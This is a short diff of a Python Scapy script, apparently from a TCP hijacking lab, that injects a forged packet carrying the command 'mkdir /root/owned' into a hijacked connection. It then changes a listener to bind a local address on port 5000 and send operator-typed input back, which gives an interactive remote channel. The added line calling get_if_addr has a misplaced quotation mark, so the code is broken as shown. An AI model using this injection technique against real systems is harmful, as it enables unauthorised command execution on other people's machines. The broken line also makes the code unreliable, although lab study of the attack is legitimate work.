@@ -9,10 +9,12 @@ def pkt_handler(pkt):
                 raw = Raw(load="mkdir /root/owned \r\n")
                 send(ip/tcp/raw, iface="br-tcphijack", verbose=0)
 
-                listener = TCPServer((pkt[IP].dst, pkt[TCP].dport))
+                local_ip = get_if_addr("br-tcphijack)"
+                local_port = 5000
+                listener = TCPServer((local_ip, local_port))
                 for address in listener:
                      print(address.recv())
-                     address.send(address.recv())
+                     address.send(input() + "\r\n")
 
 if __name__ == "__main__":
         src_addr = str(sys.argv[1])
